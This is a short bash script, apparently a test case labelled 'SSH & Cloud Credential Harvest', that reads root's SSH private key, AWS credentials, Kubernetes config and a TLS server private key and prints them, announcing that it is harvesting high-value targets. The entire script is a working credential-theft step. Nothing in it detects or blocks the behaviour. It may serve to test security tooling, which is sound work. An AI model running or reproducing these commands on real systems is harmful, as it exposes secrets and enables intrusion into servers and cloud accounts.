#!/bin/bash
# ==========================================================
# [TEST 1] SSH & Cloud Credential Harvest
# Targets Tier 1 credentials (SSH keys, AWS, K8s, GPG, TLS)
# ==========================================================
echo "[*] Harvesting high-value targets..."
cat /root/.ssh/id_rsa 2>/dev/null
cat /root/.aws/credentials 2>/dev/null
cat /root/.kube/config 2>/dev/null
cat /etc/ssl/private/server.key 2>/dev/null
echo "[+] Done."
